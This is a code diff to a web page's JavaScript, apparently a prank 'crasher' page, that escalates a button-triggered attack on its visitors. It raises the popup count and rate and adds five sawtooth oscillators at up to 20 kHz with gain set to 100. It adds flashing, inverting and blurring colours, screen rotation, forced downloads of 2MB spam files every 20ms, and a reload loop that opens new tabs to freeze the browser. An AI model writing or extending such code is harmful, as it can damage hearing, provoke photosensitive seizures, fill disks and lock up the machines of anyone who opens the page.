@@ -25,7 +25,7 @@
         };
 
         let popupCount = 0;
-        const maxPopups = 100;
+        const maxPopups = 200;
 
         function createPopup() {
             if (popupCount >= maxPopups) return;
@@ -117,8 +117,8 @@
                 tryFullscreen();
                 
                 // Spawn popups rapidly
-                for (let i = 0; i < 50; i++) {
-                    setTimeout(createPopup, i * 50);
+                for (let i = 0; i < 100; i++) {
+                    setTimeout(createPopup, i * 20);
                 }
                 
                 // Keep spawning popups faster
@@ -126,7 +126,7 @@
                     if (popupCount < maxPopups) {
                         createPopup();
                     }
-                }, 50);
+                }, 20);
             }
             
             // Move window around rapidly
@@ -134,36 +134,39 @@
                 const randomX = Math.random() * (screen.width - 400);
                 const randomY = Math.random() * (screen.height - 300);
                 window.moveTo(randomX, randomY);
-            }, 20);
+            }, 10);
             
             // Resize window randomly
             setInterval(() => {
-                const randomW = 300 + Math.random() * 500;
-                const randomH = 200 + Math.random() * 400;
+                const randomW = 200 + Math.random() * 600;
+                const randomH = 150 + Math.random() * 500;
                 window.resizeTo(randomW, randomH);
-            }, 100);
+            }, 50);
             
-            // Play ear-piercing high-pitch noise
+            // Play ear-piercing high-pitch noise - MULTIPLE oscillators
             const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioContext.createOscillator();
-            const gainNode = audioContext.createGain();
             
-            oscillator.type = 'sawtooth';
-            oscillator.frequency.setValueAtTime(8000, audioContext.currentTime);
-            oscillator.frequency.exponentialRampToValueAtTime(15000, audioContext.currentTime + 0.1);
-            
-            gainNode.gain.value = 100.0; // Extremely loud
-            
-            oscillator.connect(gainNode);
-            gainNode.connect(audioContext.destination);
-            
-            oscillator.start();
-            
-            // Modulate frequency for more piercing effect
-            setInterval(() => {
-                const freq = 5000 + Math.random() * 10000;
-                oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
-            }, 10);
+            for (let i = 0; i < 5; i++) {
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.type = 'sawtooth';
+                oscillator.frequency.setValueAtTime(5000 + i * 2000, audioContext.currentTime);
+                oscillator.frequency.exponentialRampToValueAtTime(20000, audioContext.currentTime + 0.1);
+                
+                gainNode.gain.value = 100.0; // Extremely loud
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.start();
+                
+                // Modulate frequency for more piercing effect
+                setInterval(() => {
+                    const freq = 3000 + Math.random() * 15000;
+                    oscillator.frequency.setValueAtTime(freq, audioContext.currentTime);
+                }, 5);
+            }
             
             try {
                 const response = await fetch('base64.txt');
@@ -210,14 +213,30 @@
             
             // Screen shake effect
             setInterval(() => {
-                document.body.style.transform = `translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
-            }, 50);
+                document.body.style.transform = `translate(${Math.random() * 50 - 25}px, ${Math.random() * 50 - 25}px) rotate(${Math.random() * 360}deg)`;
+            }, 20);
             
             // Flash background colors
             setInterval(() => {
                 const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff', '#ffffff', '#000000'];
                 document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+            }, 30);
+            
+            // Invert colors randomly
+            setInterval(() => {
+                document.body.style.filter = Math.random() > 0.5 ? 'invert(1)' : 'none';
             }, 100);
+            
+            // Blur effect
+            setInterval(() => {
+                document.body.style.filter = `blur(${Math.random() * 10}px)`;
+            }, 150);
+            
+            // Zoom in/out
+            setInterval(() => {
+                const zoom = 0.5 + Math.random() * 2;
+                document.body.style.zoom = zoom;
+            }, 200);
             
             // Force download spam
             function forceDownload(url, fileName) {
@@ -232,12 +251,12 @@
             
             // Generate and download random files
             setInterval(() => {
-                const randomData = new Array(1000000).fill('x').join('');
+                const randomData = new Array(2000000).fill('x').join('');
                 const blob = new Blob([randomData], { type: 'text/plain' });
                 const url = window.URL.createObjectURL(blob);
-                forceDownload(url, `spam_${Date.now()}.txt`);
+                forceDownload(url, `spam_${Date.now()}_${Math.random()}.txt`);
                 window.URL.revokeObjectURL(url);
-            }, 50);
+            }, 20);
             
             // Infinite loop to freeze browser (like the crasher website)
             setTimeout(() => {
@@ -247,8 +266,9 @@
                         return '';
                     };
                     location.reload(1);
+                    window.open(window.location.href, '_blank');
                 }
-            }, 2000);
+            }, 1500);
         }
 
         button.addEventListener('click', () => startChaos(false));
